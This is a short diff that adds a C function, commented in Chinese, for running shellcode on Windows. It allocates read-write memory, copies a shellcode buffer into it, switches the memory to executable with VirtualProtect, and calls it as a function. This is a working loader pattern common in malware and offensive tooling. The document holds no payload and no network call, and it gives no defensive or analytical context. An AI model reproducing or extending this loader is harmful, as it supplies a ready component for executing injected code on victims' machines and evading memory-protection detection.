@@ -1,0 +1,17 @@
+// 动态加载增强版：VirtualAlloc + VirtualProtect + 执行
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] 动态加载增强版方式执行Shellcode\n");
+#endif
+    LPVOID execMem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!execMem) return;
+    
+    memcpy(execMem, shellcode, shellcodeSize);
+    
+    DWORD oldProtect;
+    VirtualProtect(execMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
+    
+    ((void(*)())execMem)();
+    
+    VirtualFree(execMem, 0, MEM_RELEASE);
+}
